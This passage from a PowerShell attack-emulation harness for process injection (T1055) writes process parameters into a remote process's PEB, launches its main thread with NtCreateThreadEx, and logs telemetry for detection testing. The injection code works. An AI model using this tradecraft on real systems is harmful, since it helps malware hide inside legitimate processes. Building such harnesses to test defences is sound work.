        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }

    Write-Verbose 'Writing process parameters address to the process environment block of the remote process.'

    # Write the process parameters pointer to the PEB
    $RemoteProcessParamsPointer = [IntPtr]::Add($TargetProcessPEBAddress, $ProcessParametersOffset)
    # Allocate a pointer to contain the address to the process parameters
    $ProcessParamsPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
    [Runtime.InteropServices.Marshal]::WriteIntPtr($ProcessParamsPtr, $RemoteProcessParamsAddress)

    $BytesWritten = 0

    $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::WriteProcessMemory(
        $ProcessHandle,
        $RemoteProcessParamsPointer,
        $ProcessParamsPtr,
        ([IntPtr]::Size),
        [Ref] $BytesWritten
    );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

    [Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessParamsPtr)

    if ($Result -eq $False) {
        $ErrorString = "WriteProcessMemory failed. Error code: 0x$($LastError.NativeErrorCode.ToString('X8')). Reason: $($LastError.Message)"

        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }

    if ($UseTemplateExecutable) {
        # Remove any extra ChildProcSpawned events
        Unregister-Event -SourceIdentifier 'ProcessSpawned' -ErrorAction SilentlyContinue
        Get-Event -SourceIdentifier 'ChildProcSpawned' -ErrorAction SilentlyContinue | Remove-Event

        # Trigger an event any time powershell.exe has $TestGuid in the command line.
        # This event should correspond to the mshta or rundll process that launched it.
        $WMIEventQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 0.1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe' AND TargetInstance.CommandLine LIKE '%$($TestGuid)%'"

        Write-Verbose "Registering powershell.exe child process creation WMI event using the following WMI event query: $WMIEventQuery"

        $null = Register-CimIndicationEvent -SourceIdentifier 'ProcessSpawned' -Query $WMIEventQuery -Action {
            $SpawnedProcInfo = [PSCustomObject] @{
                ProcessId = $EventArgs.NewEvent.TargetInstance.ProcessId
                ProcessCommandLine = $EventArgs.NewEvent.TargetInstance.CommandLine
            }

            New-Event -SourceIdentifier 'ChildProcSpawned' -MessageData $SpawnedProcInfo
        }
    }

    $ThreadHandle = [IntPtr]::Zero
    $THREAD_ALL_ACCESS = 0x001FFFFF

    $RemoteEntryPoint = [IntPtr]::Add($TargetImageBaseAddress, $AddressOfEntryPointSource)

    Write-Verbose "Creating main thread in the remote process at remote entry point address: 0x$($RemoteEntryPoint.ToString('X16'))"

    $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtCreateThreadEx(
        [Ref] $ThreadHandle,
        $THREAD_ALL_ACCESS,
        ([IntPtr]::Zero),
        $ProcessHandle,
        $RemoteEntryPoint,
        ([IntPtr]::Zero),
        $False,
        0,
        0,
        0,
        ([IntPtr]::Zero)
    )

    if ($Result -ne 0) {
        $ErrorMessage = Get-NtStatusMessage -NTStatus $Result
        $ErrorString = "NtCreateThreadEx failed. Error code: 0x$($Result.ToString('X8')). Reason: $ErrorMessage"

        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }

    $ThreadID = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::GetThreadId($ThreadHandle)

    Write-Verbose "Main thread created. Thread ID: $ThreadID"

    # WMI class necessary to easily retrieve the process command-line
    $WMIProcessInfo = Get-CimInstance -ClassName Win32_Process -Property ExecutablePath, CommandLine -Filter "ProcessId = $ProcessID"

    $ProcessInfo = Get-Process -Id $ProcessID
    $ProcessMainModule = $ProcessInfo.MainModule | Select-Object -Property ModuleName, FileName, BaseAddress, ModuleMemorySize, EntryPointAddress
    $ProcessMainThread = $ProcessInfo.Threads | Where-Object { $_.Id -eq $ThreadID } | Select-Object -Property Id, StartAddress

    $TestSuccess = $null
    $SpawnedProcCommandLine = $null
    $SpawnedProcProcessId = $null

    if ($UseTemplateExecutable) {
        # Wait for the test powershell.exe execution to run
        $ChildProcSpawnedEvent = Wait-Event -SourceIdentifier 'ChildProcSpawned' -Timeout 10
        $ChildProcInfo = $null

        if ($ChildProcSpawnedEvent) {
            $TestSuccess = $True

            $ChildProcInfo = $ChildProcSpawnedEvent.MessageData
            $SpawnedProcCommandLine = $ChildProcInfo.ProcessCommandLine
            $SpawnedProcProcessId = $ChildProcInfo.ProcessId

            $ChildProcSpawnedEvent | Remove-Event
        } else {
            Write-Error "powershell.exe child process was not spawned."
        }

        # Cleanup
        Unregister-Event -SourceIdentifier 'ProcessSpawned'
    }

    [PSCustomObject] @{
        TechniqueID              = 'T1055'
        TestSuccess              = $TestSuccess
        TestGuid                 = $TestGuid
        ExecutionType            = $ExecutionType
        SourceExecutableFilePath = $SourceExePath
        SourceExecutableFileHash = $SourceExeHash
        ReplacementExecutableFilePath = $ReplacementExePath
        ReplacementExecutableFileHash = $ReplacementExeHash
        TargetExecutablePath     = $ResolvedTargetFilePath
        ProcessId                = $ProcessID
        ProcessPath              = $WMIProcessInfo.ExecutablePath
        ProcessCommandLine       = $WMIProcessInfo.CommandLine
        ProcessModule            = $ProcessMainModule
        ProcessMainThread        = $ProcessMainThread
        ParentProcessId          = $ParentProcID
        ParentProcessPath        = $WMIParentProcessInfo.ExecutablePath
        ParentProcessCommandLine = $WMIParentProcessInfo.CommandLine
        ChildProcessId           = $SpawnedProcProcessId
        ChildProcessCommandLine  = $SpawnedProcCommandLine
    }

    # Cleanup
    $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ThreadHandle)
    $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
    $TargetFileStream.Close()
}
